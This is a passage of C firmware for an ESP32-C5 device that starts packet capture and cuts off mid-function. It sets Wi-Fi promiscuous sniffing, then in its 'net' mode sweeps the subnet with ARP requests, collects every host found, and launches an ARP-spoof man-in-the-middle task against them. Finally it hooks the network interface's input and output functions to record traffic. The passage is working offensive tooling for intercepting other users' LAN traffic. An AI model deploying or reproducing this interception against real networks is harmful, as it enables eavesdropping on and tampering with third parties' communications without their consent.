brokali/projectZeroTouch/ESP32C5/main/main.c
    pcap_capture_mode = mode;
    pcap_capture_active = true;

    if (xTaskCreate(pcap_writer_task, "pcap_writer", 4096, NULL, 17,
                    &pcap_writer_task_handle) != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create PCAP writer task");
        pcap_abort_start();
        return 1;
    }

    if (mode == PCAP_MODE_RADIO) {
        wifi_promiscuous_filter_t filter = {
            .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT |
                           WIFI_PROMIS_FILTER_MASK_DATA |
                           WIFI_PROMIS_FILTER_MASK_CTRL
        };
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(pcap_radio_promiscuous_cb);
        esp_wifi_set_promiscuous(true);

        oled_display_update_full("> PCAP Radio", "  Promiscuous", "  Capturing...", pcap_capture_filepath + 18);
        MY_LOG_INFO(TAG, "PCAP radio capture started -> %s", pcap_capture_filepath);
    } else {
        esp_netif_t *capture_netif = mode == PCAP_MODE_GATEWAY
                                         ? capture_gateway_get_ap_netif()
                                         : esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
        if (!capture_netif) {
            MY_LOG_INFO(TAG, "Failed to get %s netif",
                        mode == PCAP_MODE_GATEWAY ? "Capture Gateway AP" : "STA");
            pcap_abort_start();
            return 1;
        }

        struct netif *lwip_nif = (struct netif *)esp_netif_get_netif_impl(capture_netif);
        if (!lwip_nif) {
            MY_LOG_INFO(TAG, "Failed to get lwIP netif");
            pcap_abort_start();
            return 1;
        }

        if (mode == PCAP_MODE_NET) {
            // --- Legacy ARP spoof MITM setup ---
            esp_wifi_get_mac(WIFI_IF_STA, pcap_arp_own_mac);

            esp_netif_ip_info_t ip_info;
            esp_netif_get_ip_info(capture_netif, &ip_info);
            pcap_arp_gateway_ip = ip_info.gw.addr;

        bool gw_found = false;
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *nif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                if (ip_ret->addr == pcap_arp_gateway_ip) {
                    memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
                    gw_found = true;
                    break;
                }
            }
        }
        if (!gw_found) {
            MY_LOG_INFO(TAG, "PCAP net: Gateway not in ARP table, sending ARP request...");
            ip4_addr_t gw_ip = { .addr = pcap_arp_gateway_ip };
            etharp_request(lwip_nif, &gw_ip);
            vTaskDelay(pdMS_TO_TICKS(1000));
            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *ip_ret;
                struct netif *nif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == pcap_arp_gateway_ip) {
                        memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
                        gw_found = true;
                        break;
                    }
                }
            }
        }
        if (!gw_found) {
            MY_LOG_INFO(TAG, "PCAP net: Could not find gateway MAC. Continuing without ARP spoof.");
        } else {
            MY_LOG_INFO(TAG, "PCAP net: Gateway %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X",
                        ip4_addr1_val(ip_info.gw), ip4_addr2_val(ip_info.gw),
                        ip4_addr3_val(ip_info.gw), ip4_addr4_val(ip_info.gw),
                        pcap_arp_gateway_mac[0], pcap_arp_gateway_mac[1], pcap_arp_gateway_mac[2],
                        pcap_arp_gateway_mac[3], pcap_arp_gateway_mac[4], pcap_arp_gateway_mac[5]);

            oled_display_update_full("> PCAP Net", "  ARP scanning...", "  Discovering hosts", "");
            MY_LOG_INFO(TAG, "PCAP net: Scanning subnet for hosts...");

            uint32_t ip_h = ntohl(ip_info.ip.addr);
            uint32_t mask_h = ntohl(ip_info.netmask.addr);
            uint32_t net_h = ip_h & mask_h;
            uint32_t bcast_h = net_h | ~mask_h;
            int req_sent = 0;
            for (uint32_t t = net_h + 1; t < bcast_h && req_sent < 254; t++) {
                ip4_addr_t target_ip;
                target_ip.addr = htonl(t);
                etharp_request(lwip_nif, &target_ip);
                req_sent++;
                if (req_sent % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));
            }
            MY_LOG_INFO(TAG, "PCAP net: Sent %d ARP requests, waiting for responses...", req_sent);
            vTaskDelay(pdMS_TO_TICKS(3000));

            pcap_arp_host_count = 0;
            uint32_t own_ip = ip_info.ip.addr;
            for (int i = 0; i < ARP_TABLE_SIZE && pcap_arp_host_count < PCAP_ARP_MAX_HOSTS; i++) {
                ip4_addr_t *ip_ret;
                struct netif *nif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == own_ip || ip_ret->addr == pcap_arp_gateway_ip) continue;
                    memcpy(pcap_arp_hosts[pcap_arp_host_count].mac, eth_ret->addr, 6);
                    pcap_arp_hosts[pcap_arp_host_count].ip = ip_ret->addr;
                    pcap_arp_host_count++;
                }
            }

            MY_LOG_INFO(TAG, "PCAP net: Found %d hosts to spoof", pcap_arp_host_count);

            if (pcap_arp_host_count > 0) {
                pcap_arp_active = true;
                xTaskCreate(pcap_arp_spoof_task, "pcap_arp", 4096, NULL, 5, &pcap_arp_task_handle);
                MY_LOG_INFO(TAG, "PCAP net: ARP spoof MITM started (IP forwarding enabled)");
            }
        }
            // --- End legacy ARP spoof setup ---
        }

        pcap_original_input = lwip_nif->input;
        pcap_original_linkoutput = lwip_nif->linkoutput;
        pcap_hooked_netif = lwip_nif;
        lwip_nif->input = pcap_netif_input_hook;
        lwip_nif->linkoutput = pcap_netif_linkoutput_hook;

